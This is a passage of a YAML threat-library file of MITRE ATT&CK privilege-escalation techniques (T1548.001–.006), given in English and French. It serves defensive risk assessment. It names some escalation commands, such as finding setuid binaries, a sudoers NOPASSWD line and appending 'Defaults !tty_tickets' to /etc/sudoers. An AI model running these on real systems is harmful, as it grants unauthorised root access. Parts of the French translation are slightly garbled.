          \ u+s [fichier].</code> Cela permettra de faire la partie s\xE9tuide. Pour\
          \ d\xE9sactiver le bit setgid, <code>chmod 2775</code> et <code>chmod g+s</code>\
          \ peuvent \xEAtre utilis\xE9s.\n\nLes adversaires peuvent utiliser ce m\xE9\
          canisme sur leur propre malware pour s\u2019assurer qu\u2019ils pourront\
          \ \xEAtre ex\xE9cut\xE9s dans des contextes \xE9lev\xE9s \xE0 l\u2019avenir.\
          \ (Citation : malware OSX Keydnap) Cet abus fait souvent partie d\u2019\
          une \xAB fuite de coquille \xBB ou d\u2019autres actions visant \xE0 contourner\
          \ un environnement d\u2019ex\xE9cution avec des autorisations restreintes.\n\
          \nAlternativement, les adversaires peuvent choisir de trouver et cibler\
          \ des binaires vuln\xE9rables avec les bits de setuid ou setgid d\xE9j\xE0\
          \ activ\xE9s (par exemple [D\xE9couverte de fichiers et de r\xE9pertoire](https://attack.mitre.org/techniques/T1083)).\
          \ Les bits de setuid et setguid sont indiqu\xE9s par un \xAB s \xBB au lieu\
          \ d\u2019un \xAB x \xBB lors de la visualisation des attributs d\u2019un\
          \ fichier via <code>ls -l</code>. La commande <code>find</code> peut \xE9\
          galement \xEAtre utilis\xE9e pour rechercher de tels fichiers. Par exemple,\
          \ <code>find / -perm +4000 2>/dev/null</code> peut \xEAtre utilis\xE9 pour\
          \ trouver des fichiers avec setuid set, et <code>find / -perm +2000 2>/dev/null</code>\
          \ peut \xEAtre utilis\xE9 pour setgid. Les binaires dont ces bits sont activ\xE9\
          s peuvent alors \xEAtre abus\xE9s par les adversaires. (Citation : va-t\u2019\
          enBins Suid)\nhttps://attack.mitre.org/techniques/T1548/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.002
    ref_id: T1548.002
    name: Bypass User Account Control
    description: 'Adversaries may bypass UAC mechanisms to elevate process privileges
      on system. Windows User Account Control (UAC) allows a program to elevate its
      privileges (tracked as integrity levels ranging from low to high) to perform
      a task under administrator-level permissions, possibly by prompting the user
      for confirmation. The impact to the user ranges from denying the operation under
      high enforcement to allowing the user to perform the action if they are in the
      local administrators group and click through the prompt or allowing them to
      enter an administrator password to complete the action.(Citation: TechNet How
      UAC Works)


      If the UAC protection level of a computer is set to anything but the highest
      level, certain Windows programs can elevate privileges or execute some elevated
      [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects
      without prompting the user through the UAC notification box.(Citation: TechNet
      Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011)
      to load a specifically crafted DLL which loads an auto-elevated [Component Object
      Model](https://attack.mitre.org/techniques/T1559/001) object and performs a
      file operation in a protected directory which would typically require elevated
      access. Malicious software may also be injected into a trusted process to gain
      elevated privileges without prompting a user.(Citation: Davidson Windows)


      Many methods have been discovered to bypass UAC. The Github readme page for
      UACME contains an extensive list of methods(Citation: Github UACMe) that have
      been discovered and implemented, but may not be a comprehensive list of bypasses.
      Additional bypass methods are regularly discovered and some used in the wild,
      such as:


      * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary
      or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)


      Another bypass is possible through some lateral movement techniques if credentials
      for an account with administrator privileges are known, since UAC is a single
      system security mechanism, and the privilege or integrity of a process running
      on one system will be unknown on remote systems and default to high integrity.(Citation:
      SANS UAC Bypass)

      https://attack.mitre.org/techniques/T1548/002'
    translations:
      fr:
        name: "Contourner le contr\xF4le des comptes utilisateurs"
        description: "Les adversaires peuvent contourner les m\xE9canismes UAC pour\
          \ augmenter les privil\xE8ges de processus sur le syst\xE8me. Le Contr\xF4\
          le des comptes utilisateurs Windows (UAC) permet \xE0 un programme d\u2019\
          augmenter ses privil\xE8ges (suivis en termes de niveaux d\u2019int\xE9\
          grit\xE9 allant de faible \xE0 \xE9lev\xE9) pour effectuer une t\xE2che\
          \ sous des autorisations de niveau administrateur, \xE9ventuellement en\
          \ sollicitant l\u2019utilisateur pour confirmer. L\u2019impact pour l\u2019\
          utilisateur va du refus de l\u2019op\xE9ration sous forte application \xE0\
          \ la possibilit\xE9 d\u2019effectuer l\u2019action s\u2019il est dans le\
          \ groupe des administrateurs locaux et clique sur l\u2019invite, ou encore\
          \ de lui permettre d\u2019entrer un mot de passe administrateur pour effectuer\
          \ l\u2019action. (Citation : TechNet Comment fonctionne l\u2019UAC)\n\n\
          Si le niveau de protection UAC d\u2019un ordinateur est r\xE9gl\xE9 \xE0\
          \ autre chose que le niveau le plus \xE9lev\xE9, certains programmes Windows\
          \ peuvent augmenter des privil\xE8ges ou ex\xE9cuter certains objets [Component\
          \ Object Model](https://attack.mitre.org/techniques/T1559/001) \xE9lev\xE9\
          s sans que l\u2019utilisateur ne demande rien via la bo\xEEte de notification\
          \ UAC. (Citation : TechNet \xE0 l\u2019int\xE9rieur de l\u2019UAC)(Citation\
          \ : \xC9l\xE9vation MSDN COM) Un exemple est l\u2019utilisation de [Rundll32](https://attack.mitre.org/techniques/T1218/011)\
          \ pour charger une DLL sp\xE9cifiquement con\xE7ue qui charge un objet [Component\
          \ Object Model](https://attack.mitre.org/techniques/T1559/001) auto-\xE9\
          lev\xE9 et effectue une op\xE9ration de fichier dans un r\xE9pertoire prot\xE9\
          g\xE9 qui n\xE9cessiterait g\xE9n\xE9ralement un acc\xE8s \xE9lev\xE9. Un\
          \ logiciel malveillant peut \xE9galement \xEAtre inject\xE9 dans un processus\
          \ de confiance pour obtenir des privil\xE8ges \xE9lev\xE9s sans que l\u2019\
          utilisateur ne le demande. (Citation : Fen\xEAtres Davidson)\n\nDe nombreuses\
          \ m\xE9thodes ont \xE9t\xE9 d\xE9couvertes pour contourner le UAC. La page\
          \ readme Github pour UACME contient une liste \xE9tendue de m\xE9thodes\
          \ (Citation : Github UACMe) qui ont \xE9t\xE9 d\xE9couvertes et impl\xE9\
          ment\xE9es, mais il se peut que ce ne soit pas une liste exhaustive des\
          \ contournements. D\u2019autres m\xE9thodes de contournement sont r\xE9\
          guli\xE8rement d\xE9couvertes et certaines utilis\xE9es dans la nature,\
          \ telles que :\n\n* <code>eventvwr.exe</code> peut auto-\xE9lever et ex\xE9\
          cuter un binaire ou un script sp\xE9cifi\xE9. (Citation : contournement\
          \ UAC sans fichiers enigma0x3)(Citation : Fortinet Fareit)\n\nUn autre contournement\
          \ est possible gr\xE2ce \xE0 certaines techniques de d\xE9placement lat\xE9\
          ral si les identifiants d\u2019un compte avec des privil\xE8ges administrateur\
          \ sont connus, puisque l\u2019UAC est un m\xE9canisme de s\xE9curit\xE9\
          \ syst\xE8me unique, et que le privil\xE8ge ou l\u2019int\xE9grit\xE9 d\u2019\
          un processus fonctionnant sur un syst\xE8me sera inconnu sur les syst\xE8\
          mes distants et sera par d\xE9faut tr\xE8s int\xE9gral. (Citation : Contournement\
          \ UAC SANS )\nhttps://attack.mitre.org/techniques/T1548/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.003
    ref_id: T1548.003
    name: Sudo and Sudo Caching
    description: 'Adversaries may perform sudo caching and/or use the sudoers file
      to elevate privileges. Adversaries may do this to execute commands as other
      users or spawn processes with higher privileges.


      Within Linux and MacOS systems, sudo (sometimes referred to as "superuser do")
      allows users to perform commands from terminals with elevated privileges and
      to control who can perform these commands on the system. The <code>sudo</code>
      command "allows a system administrator to delegate authority to give certain
      users (or groups of users) the ability to run some (or all) commands as root
      or another user while providing an audit trail of the commands and their arguments."(Citation:
      sudo man page 2018) Since sudo was made for the system administrator, it has
      some useful configuration features such as a <code>timestamp_timeout</code>,
      which is the amount of time in minutes between instances of <code>sudo</code>
      before it will re-prompt for a password. This is because <code>sudo</code> has
      the ability to cache credentials for a period of time. Sudo creates (or touches)
      a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run
      to determine this timeout. Additionally, there is a <code>tty_tickets</code>
      variable that treats each new tty (terminal session) in isolation. This means
      that, for example, the sudo timeout of one tty will not affect another tty (you
      will have to type the password again).


      The sudoers file, <code>/etc/sudoers</code>, describes which users can run which
      commands and from which terminals. This also describes which commands users
      can run as other users or groups. This provides the principle of least privilege
      such that users are running in their lowest possible permissions for most of
      the time and only elevate to other users or permissions as needed, typically
      by prompting for a password. However, the sudoers file can also specify when
      to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD:
      ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit
      this file though.


      Adversaries can also abuse poor configurations of these mechanisms to escalate
      privileges without needing the user''s password. For example, <code>/var/db/sudo</code>''s
      timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code>
      range. If it does, then malware can execute sudo commands without needing to
      supply the user''s password. Additional, if <code>tty_tickets</code> is disabled,
      adversaries can do this from any tty for that user.


      In the wild, malware has disabled <code>tty_tickets</code> to potentially make
      scripting easier by issuing <code>echo \''Defaults !tty_tickets\'' >> /etc/sudoers</code>.(Citation:
      cybereason osx proton) In order for this change to be reflected, the malware
      also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file
      has <code>tty_tickets</code> enabled by default.

      https://attack.mitre.org/techniques/T1548/003'
    translations:
      fr:
        name: Sudo et Sudo Caching
        description: "Les adversaires peuvent effectuer un cache sudo et/ou utiliser\
          \ le fichier sudoer pour augmenter les privil\xE8ges. Les adversaires peuvent\
          \ faire cela pour ex\xE9cuter des commandes en nombre d\u2019autres utilisateurs\
          \ ou faire appara\xEEtre des processus avec des privil\xE8ges plus \xE9\
          lev\xE9s.\n\nDans les syst\xE8mes Linux et MacOS, sudo (parfois appel\xE9\
          \ \xAB superuser do \xBB) permet aux utilisateurs d\u2019ex\xE9cuter des\
          \ commandes depuis des terminaux avec des privil\xE8ges \xE9lev\xE9s et\
          \ de contr\xF4ler qui peut ex\xE9cuter ces commandes sur le syst\xE8me.\
          \ La commande <code>sudo</code> \xAB permet \xE0 un administrateur syst\xE8\
          me de d\xE9l\xE9guer l\u2019autorit\xE9 pour donner \xE0 certains utilisateurs\
          \ (ou groupes d\u2019utilisateurs) la capacit\xE9 d\u2019ex\xE9cuter certaines\
          \ (ou toutes) commandes en tant que root ou un autre utilisateur tout en\
          \ fournissant une trace d\u2019audit des commandes et de leurs arguments.\
          \ \xBB (Citation : page sudo man 2018) Puisque Sudo a \xE9t\xE9 con\xE7\
          u pour l\u2019administrateur syst\xE8me, il dispose de fonctionnalit\xE9\
          s de configuration utiles comme un <code>timestamp_timeout</code>, qui correspond\
          \ au temps en minutes entre les instances de <code>Sudo</code> avant qu\u2019\
          il ne redemande un mot de passe. Cela s\u2019explique par le fait que <code>sudo</code>\
          \ a la capacit\xE9 de mettre en cache les identifiants pendant une certaine\
          \ p\xE9riode. Sudo cr\xE9e (ou touche) un fichier \xE0 <code>/var/db/sudo</code>\
          \ avec un horodatage indiquant la derni\xE8re ex\xE9cution de sudo pour\
          \ d\xE9terminer ce d\xE9lai d\u2019attente. De plus, il existe une <code>variable\
          \ tty_tickets</code> qui traite chaque nouvelle session terminale (TTY)\
          \ isol\xE9ment. Cela signifie que, par exemple, le d\xE9lai d\u2019attente\
          \ d\u2019un TTY n\u2019affectera pas un autre TTY (vous devrez taper le\
          \ mot de passe \xE0 nouveau).\n\nLe fichier sudoers, <code>/etc/sudoers</code>,\
          \ d\xE9crit quels utilisateurs peuvent ex\xE9cuter quelles commandes et\
          \ depuis quels terminaux. Cela d\xE9crit \xE9galement quelles commandes\
          \ les utilisateurs peuvent ex\xE9cuter en tant qu\u2019autres utilisateurs\
          \ ou groupes. Cela \xE9tablit le principe du moindre privil\xE8ge, de sorte\
          \ que les utilisateurs fonctionnent avec leurs permissions les plus basses\
          \ possibles la plupart du temps et ne passent \xE0 d\u2019autres utilisateurs\
          \ ou aux permissions que si n\xE9cessaire, g\xE9n\xE9ralement en demandant\
          \ un mot de passe. Cependant, le fichier sudoers peut aussi sp\xE9cifier\
          \ quand il ne faut pas demander de mots de passe aux utilisateurs avec une\
          \ ligne comme <code>user1 ALL=(ALL) NOPASSWD\_: ALL.</code> (Citation :\
          \ OSX. Dok Malware) Des privil\xE8ges \xE9lev\xE9s sont cependant n\xE9\
          cessaires pour modifier ce fichier.\n\nLes adversaires peuvent \xE9galement\
          \ abuser de mauvaises configurations de ces m\xE9canismes pour augmenter\
          \ les privil\xE8ges sans avoir besoin du mot de passe de l\u2019utilisateur.\
          \ Par exemple, l\u2019horodatage <code>de /var/db/sudo</code> peut \xEA\
          tre surveill\xE9 pour voir s\u2019il se situe dans la plage <code>timestamp_timeout</code>.\
          \ Si c\u2019est le cas, alors le malware peut ex\xE9cuter des commandes\
          \ sudo sans avoir besoin de fournir le mot de passe de l\u2019utilisateur.\
          \ De plus, si <code>tty_tickets</code> est d\xE9sactiv\xE9, les adversaires\
          \ peuvent le faire depuis n\u2019importe quel TTY pour cet utilisateur.\n\
          \nDans la nature, les malwares ont <code>d\xE9sactiv\xE9 tty_tickets</code>\
          \ pour potentiellement faciliter le scripting en publiant <code>des echo\
          \ \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>. (Citation : cybereason\
          \ osx proton) Pour que ce changement soit pris en compte, le malware a \xE9\
          galement \xE9mis le <code>terminal killall</code>. Depuis macOS Sierra,\
          \ le fichier sudoers <code>tty_tickets</code> activ\xE9 par d\xE9faut.\n\
          https://attack.mitre.org/techniques/T1548/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.004
    ref_id: T1548.004
    name: Elevated Execution with Prompt
    description: "Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code>\
      \ API to escalate privileges by prompting the user for credentials.(Citation:\
      \ AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to\
      \ give application developers an easy way to perform operations with root privileges,\
      \ such as for application installation or updating. This API does not validate\
      \ that the program requesting root privileges comes from a reputable source\
      \ or has been maliciously modified. \n\nAlthough this API is deprecated, it\
      \ still fully functions in the latest releases of macOS. When calling this API,\
      \ the user will be prompted to enter their credentials but no checks on the\
      \ origin or integrity of the program are made. The program calling the API may\
      \ also load world writable files which can be modified to perform malicious\
      \ behavior with elevated privileges.\n\nAdversaries may abuse <code>AuthorizationExecuteWithPrivileges</code>\
      \ to obtain root privileges in order to install malicious software on victims\
      \ and install persistence mechanisms.(Citation: Death by 1000 installers; it's\
      \ all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot\
      \ RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036)\
      \ to trick the user into granting escalated privileges to malicious code.(Citation:\
      \ Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer\
      \ Feb 2019) This technique has also been shown to work by modifying legitimate\
      \ programs present on the machine that make use of this API.(Citation: Death\
      \ by 1000 installers; it's all broken!)\nhttps://attack.mitre.org/techniques/T1548/004"
    translations:
      fr:
        name: "Ex\xE9cution \xE9lev\xE9e avec prompt"
        description: "Les adversaires peuvent utiliser l\u2019API <code>AuthorizationExecuteWithPrivileges</code>\
          \ pour escalader les privil\xE8ges en demandant \xE0 l\u2019utilisateur\
          \ des identifiants. (Citation : AppleDocs AuthorizationExecuteWithPrivileges)\
          \ Le but de cette API est de fournir aux d\xE9veloppeurs d\u2019applications\
          \ un moyen simple d\u2019effectuer des op\xE9rations avec des privil\xE8\
          ges root, comme pour l\u2019installation ou la mise \xE0 jour d\u2019applications.\
          \ Cette API ne valide pas que le programme demandant les privil\xE8ges racines\
          \ provient d\u2019une source fiable ou a \xE9t\xE9 modifi\xE9 de mani\xE8\
          re malveillante. \n\nBien que cette API soit obsol\xE8te, elle fonctionne\
          \ toujours pleinement dans les derni\xE8res versions de macOS. Lors de l\u2019\
          appel de cette API, l\u2019utilisateur sera invit\xE9 \xE0 saisir ses identifiants,\
          \ mais aucune v\xE9rification de l\u2019origine ou de l\u2019int\xE9grit\xE9\
          \ du programme n\u2019est effectu\xE9e. Le programme appelant l\u2019API\
          \ peut \xE9galement charger des fichiers auto-\xE9crivables dans le monde\
          \ qui peuvent \xEAtre modifi\xE9s pour ex\xE9cuter des comportements malveillants\
          \ avec des privil\xE8ges \xE9lev\xE9s.\n\nLes adversaires peuvent abuser\
          \ <code>d\u2019AuthorizationExecuteWithPrivileges</code> pour obtenir des\
          \ privil\xE8ges root afin d\u2019installer des logiciels malveillants sur\
          \ les victimes et de mettre en place des m\xE9canismes de persistance. (Citation\
          \ : Mort par 1000 installateurs ; tout est cass\xE9 !)(Citation : Carbon\
          \ Black Shlayer f\xE9vr. 2019)(Citation : OSX Coldroot RAT) Cette technique\
          \ peut \xEAtre combin\xE9e avec [Masquerading](https://attack.mitre.org/techniques/T1036)\
          \ pour tromper l\u2019utilisateur et lui faire accorder des privil\xE8ges\
          \ escalad\xE9s au code malveillant. (Citation : Mort par 1000 installateurs\
          \ ; tout est cass\xE9 !)(Citation : Carbon Black Shlayer f\xE9vr. 2019)\
          \ Cette technique a \xE9galement d\xE9montr\xE9 son efficacit\xE9 en modifiant\
          \ les programmes l\xE9gitimes pr\xE9sents sur la machine qui utilisent cette\
          \ API. (Citation : Mort par 1000 installateurs ; tout est cass\xE9 !)\n\
          https://attack.mitre.org/techniques/T1548/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.005
    ref_id: T1548.005
    name: Temporary Elevated Cloud Access
    description: "Adversaries may abuse permission configurations that allow them\
      \ to gain temporarily elevated access to cloud resources. Many cloud environments\
      \ allow administrators to grant user or service accounts permission to request\
      \ just-in-time access to roles, impersonate other accounts, pass roles onto\
      \ resources and services, or otherwise gain short-term access to a set of privileges\
      \ that may be distinct from their own. \n\nJust-in-time access is a mechanism\
      \ for granting additional roles to cloud accounts in a granular, temporary manner.\
      \ This allows accounts to operate with only the permissions they need on a daily\
      \ basis, and to request additional permissions as necessary. Sometimes just-in-time\
      \ access requests are configured to require manual approval, while other times\
      \ the desired permissions are automatically granted.(Citation: Azure Just in\
      \ Time Access 2023)\n\nAccount impersonation allows user or service accounts\
      \ to temporarily act with the permissions of another account. For example, in\
      \ GCP users with the `iam.serviceAccountTokenCreator` role can create temporary\
      \ access tokens or sign arbitrary payloads with the permissions of a service\
      \ account, while service accounts with domain-wide delegation permission are\
      \ permitted to impersonate Google Workspace accounts.(Citation: Google Cloud\
      \ Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation\
      \ Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation:\
      \ Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange\
      \ Online, the `ApplicationImpersonation` role allows a service account to use\
      \ the permissions associated with specified user accounts.(Citation: Microsoft\
      \ Impersonation and EWS in Exchange) \n\nMany cloud environments also include\
      \ mechanisms for users to pass roles to resources that allow them to perform\
      \ tasks and authenticate to other services. While the user that creates the\
      \ resource does not directly assume the role they pass to it, they may still\
      \ be able to take advantage of the role's access -- for example, by configuring\
      \ the resource to perform certain actions with the permissions it has been granted.\
      \ In AWS, users with the `PassRole` permission can allow a service they create\
      \ to assume a given role, while in GCP, users with the `iam.serviceAccountUser`\
      \ role can attach a service account to a resource.(Citation: AWS PassRole)(Citation:\
      \ Google Cloud Service Account Authentication Roles)\n\nWhile users require\
      \ specific role assignments in order to use any of these features, cloud administrators\
      \ may misconfigure permissions. This could result in escalation paths that allow\
      \ adversaries to gain access to resources beyond what was originally intended.(Citation:\
      \ Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS\
      \ Privilege Escalation)\n\n**Note:** this technique is distinct from [Additional\
      \ Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves\
      \ assigning permanent roles to accounts rather than abusing existing permissions\
      \ structures to gain temporarily elevated access to resources. However, adversaries\
      \ that compromise a sufficiently privileged account may grant another account\
      \ they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)\
      \ that would allow them to also abuse these features. This may also allow for\
      \ greater stealth than would be had by directly using the highly privileged\
      \ account, especially when logs do not clarify when role impersonation is taking\
      \ place.(Citation: CrowdStrike StellarParticle January 2022)\nhttps://attack.mitre.org/techniques/T1548/005"
    translations:
      fr:
        name: "Acc\xE8s temporaire sur\xE9lev\xE9 au cloud"
        description: "Les attaquants peuvent exploiter les configurations d\u2019\
          autorisations qui leur permettent d\u2019obtenir temporairement un acc\xE8\
          s privil\xE9gi\xE9 aux ressources cloud. De nombreux environnements cloud\
          \ permettent aux administrateurs d\u2019accorder \xE0 des comptes d\u2019\
          utilisateurs ou de services l\u2019autorisation de demander un acc\xE8s\
          \ \xAB juste \xE0 temps \xBB \xE0 des r\xF4les, d\u2019usurper l\u2019identit\xE9\
          \ d\u2019autres comptes, de transf\xE9rer des r\xF4les vers des ressources\
          \ et des services, ou encore d\u2019obtenir de toute autre mani\xE8re un\
          \ acc\xE8s \xE0 court terme \xE0 un ensemble de privil\xE8ges pouvant \xEA\
          tre distincts des leurs. \n\nL\u2019acc\xE8s \xAB juste \xE0 temps \xBB\
          \ est un m\xE9canisme permettant d\u2019attribuer des r\xF4les suppl\xE9\
          mentaires \xE0 des comptes cloud de mani\xE8re granulaire et temporaire.\
          \ Cela permet aux comptes de fonctionner avec uniquement les autorisations\
          \ dont ils ont besoin au quotidien, et de demander des autorisations suppl\xE9\
          mentaires si n\xE9cessaire. Parfois, les demandes d\u2019acc\xE8s \xAB juste\
          \ \xE0 temps \xBB sont configur\xE9es pour n\xE9cessiter une validation\
          \ manuelle, tandis que dans d\u2019autres cas, les autorisations souhait\xE9\
          es sont accord\xE9es automatiquement. (R\xE9f\xE9rence : Azure Just in Time\
          \ Access 2023)\n\nL'usurpation d'identit\xE9 d'un compte permet \xE0 des\
          \ comptes utilisateur ou de service d'agir temporairement avec les autorisations\
          \ d'un autre compte. Par exemple, dans GCP, les utilisateurs disposant du\
          \ r\xF4le `iam.serviceAccountTokenCreator` peuvent cr\xE9er des jetons d'acc\xE8\
          s temporaires ou signer des charges utiles arbitraires avec les autorisations\
          \ d'un compte de service, tandis que les comptes de service disposant d'une\
          \ autorisation de d\xE9l\xE9gation \xE0 l'\xE9chelle du domaine sont autoris\xE9\
          s \xE0 usurper l'identit\xE9 de comptes Google Workspace. (R\xE9f\xE9rence\
          \ : R\xF4les d'authentification des comptes de service Google Cloud) (R\xE9\
          f\xE9rence : Hunters \u2013 D\xE9l\xE9gation \xE0 l\u2019\xE9chelle du domaine\
          \ dans Google Workspace 2023) (R\xE9f\xE9rence : Acc\xE8s \xAB juste \xE0\
          \ temps \xBB dans Google Cloud 2023) (R\xE9f\xE9rence : Palo Alto Unit 42\
          \ \u2013 D\xE9l\xE9gation \xE0 l\u2019\xE9chelle du domaine dans Google\
          \ Workspace 2023). Dans Exchange Online, le r\xF4le `ApplicationImpersonation`\
          \ permet \xE0 un compte de service d\u2019utiliser les autorisations associ\xE9\
          es \xE0 des comptes utilisateur sp\xE9cifi\xE9s. (R\xE9f\xE9rence : Usurpation\
          \ d\u2019identit\xE9 et EWS dans Exchange de Microsoft) \n\nDe nombreux\
          \ environnements cloud int\xE8grent \xE9galement des m\xE9canismes permettant\
          \ aux utilisateurs d\u2019attribuer des r\xF4les \xE0 des ressources afin\
          \ de leur permettre d\u2019effectuer des t\xE2ches et de s\u2019authentifier\
          \ aupr\xE8s d\u2019autres services. Bien que l\u2019utilisateur qui cr\xE9\
          e la ressource n\u2019assume pas directement le r\xF4le qu\u2019il lui attribue,\
          \ il peut n\xE9anmoins tirer parti des droits d\u2019acc\xE8s de ce r\xF4\
          le \u2014 par exemple, en configurant la ressource pour qu\u2019elle effectue\
          \ certaines actions gr\xE2ce aux autorisations qui lui ont \xE9t\xE9 accord\xE9\
          es. Dans AWS, les utilisateurs disposant de l\u2019autorisation `PassRole`\
          \ peuvent autoriser un service qu\u2019ils cr\xE9ent \xE0 endosser un r\xF4\
          le donn\xE9, tandis que dans GCP, les utilisateurs disposant du r\xF4le\
          \ `iam.serviceAccountUser` peuvent associer un compte de service \xE0 une\
          \ ressource. (R\xE9f\xE9rence : AWS PassRole) (R\xE9f\xE9rence : R\xF4les\
          \ d\u2019authentification des comptes de service Google Cloud)\n\nBien que\
          \ les utilisateurs aient besoin de se voir attribuer des r\xF4les sp\xE9\
          cifiques pour pouvoir utiliser l\u2019une de ces fonctionnalit\xE9s, les\
          \ administrateurs cloud peuvent mal configurer les autorisations. Cela pourrait\
          \ donner lieu \xE0 des voies d\u2019escalade permettant \xE0 des attaquants\
          \ d\u2019acc\xE9der \xE0 des ressources au-del\xE0 de ce qui \xE9tait initialement\
          \ pr\xE9vu. (R\xE9f\xE9rence : Rhino Google Cloud Privilege Escalation)\
          \ (R\xE9f\xE9rence : Rhino Security Labs AWS Privilege Escalation)\n\n**Remarque\
          \ :** cette technique est distincte des [r\xF4les cloud suppl\xE9mentaires](https://attack.mitre.org/techniques/T1098/003),\
          \ qui consistent \xE0 attribuer des r\xF4les permanents \xE0 des comptes\
          \ plut\xF4t qu\u2019\xE0 exploiter les structures d\u2019autorisations existantes\
          \ pour obtenir temporairement un acc\xE8s privil\xE9gi\xE9 aux ressources.\
          \ Toutefois, les attaquants qui compromettent un compte disposant de privil\xE8\
          ges suffisants peuvent attribuer \xE0 un autre compte qu\u2019ils contr\xF4\
          lent des [r\xF4les cloud suppl\xE9mentaires](https://attack.mitre.org/techniques/T1098/003),\
          \ ce qui leur permettrait \xE9galement d\u2019exploiter ces fonctionnalit\xE9\
          s. Cela peut \xE9galement leur permettre d\u2019agir de mani\xE8re plus\
          \ discr\xE8te que s\u2019ils utilisaient directement le compte hautement\
          \ privil\xE9gi\xE9, en particulier lorsque les journaux ne permettent pas\
          \ de d\xE9terminer clairement quand l\u2019usurpation de r\xF4le a lieu.\
          \ (R\xE9f\xE9rence : CrowdStrike StellarParticle, janvier 2022)\nhttps://attack.mitre.org/techniques/T1548/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.006
    ref_id: T1548.006
    name: TCC Manipulation
    description: 'Adversaries can manipulate or abuse the Transparency, Consent, &
      Control (TCC) service or database to grant malicious executables elevated permissions.
      TCC is a Privacy & Security macOS control mechanism used to determine if the
      running process has permission to access the data or services protected by TCC,
      such as screen sharing, camera, microphone, or Full Disk Access (FDA).


      When an application requests to access data or a service protected by TCC, the
      TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application
      Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file
      (if connected to an MDM) for existing permissions. If permissions do not exist,
      then the user is prompted to grant permission. Once permissions are granted,
      the database stores the application''s permissions and will not prompt the user
      again unless reset. For example, when a web browser requests permissions to
      the user''s webcam, once granted the web browser may not explicitly prompt the
      user again.(Citation: welivesecurity TCC)


      Adversaries may access restricted data or services protected by TCC through
      abusing applications previously granted permissions through [Process Injection](https://attack.mitre.org/techniques/T1055)
      or executing a malicious binary using another application. For example, adversaries
      can use Finder, a macOS native app with FDA permissions, to execute a malicious
      [AppleScript](https://attack.mitre.org/techniques/T1059/002). When executing
      under the Finder App, the malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002)
      inherits access to all files on the system without requiring a user prompt.
      When System Integrity Protection (SIP) is disabled, TCC protections are also
      disabled. For a system without SIP enabled, adversaries can manipulate the TCC
      database to add permissions to their malicious executable through loading an
      adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation:
      TCC macOS bypass)(Citation: TCC Database)

      https://attack.mitre.org/techniques/T1548/006'
    translations:
      fr:
        name: TCC Manipulation
        description: "Les adversaires peuvent manipuler ou abuser du service ou de\
          \ la base de donn\xE9es Transparence, Consentement et Contr\xF4le (TCC)\
          \ pour accorder des autorisations \xE9lev\xE9es aux ex\xE9cutables malveillants.\
          \ Le TCC est un m\xE9canisme de contr\xF4le de la confidentialit\xE9 et\
          \ de la s\xE9curit\xE9 sur macOS utilis\xE9 pour d\xE9terminer si le processus\
          \ en cours d\u2019ex\xE9cution a la permission d\u2019acc\xE9der aux donn\xE9\
          es ou services prot\xE9g\xE9s par le TCC, tels que le partage d\u2019\xE9\
          cran, la cam\xE9ra, le microphone ou l\u2019acc\xE8s complet au disque (FDA).\n\
          \nLorsqu\u2019une application demande \xE0 acc\xE9der \xE0 des donn\xE9\
          es ou \xE0 un service prot\xE9g\xE9 par TCC, le d\xE9mon TCC ('tccd') v\xE9\
          rifie la base de donn\xE9es TCC, situ\xE9e \xE0 '/Library/Application Support/com.apple.TCC/TCC.db'\
          \ (et \xE9quivalent '~/'), ainsi qu\u2019un fichier d\u2019\xE9crasement\
          \ (s\u2019il est connect\xE9 \xE0 un MDM) pour les autorisations existantes.\
          \ Si les permissions n\u2019existent pas, l\u2019utilisateur est invit\xE9\
          \ \xE0 accorder la permission. Une fois les permissions accord\xE9es, la\
          \ base de donn\xE9es stocke les autorisations de l\u2019application et ne\
          \ sollicitera plus l\u2019utilisateur \xE0 moins d\u2019\xEAtre r\xE9initialis\xE9\
          e. Par exemple, lorsqu\u2019un navigateur web demande des permissions \xE0\
          \ la webcam de l\u2019utilisateur, une fois accord\xE9, le navigateur web\
          \ peut ne pas explicitement inviter l\u2019utilisateur \xE0 nouveau. (Citation\
          \ : welivesecurity TCC)\n\nLes adversaires peuvent acc\xE9der \xE0 des donn\xE9\
          es ou services restreints prot\xE9g\xE9s par TCC en abusant d\u2019applications\
          \ ayant d\xE9j\xE0 accord\xE9 des autorisations via [Process Injection](https://attack.mitre.org/techniques/T1055)\
          \ ou en ex\xE9cutant un binaire malveillant via une autre application. Par\
          \ exemple, les adversaires peuvent utiliser Finder, une application native\
          \ macOS avec des autorisations FDA, pour ex\xE9cuter un [AppleScript](https://attack.mitre.org/techniques/T1059/002\
          \ malveillant). Lors de l\u2019ex\xE9cution via l\u2019application Finder,\
          \ l'[AppleScript](https://attack.mitre.org/techniques/T1059/002) malveillant\
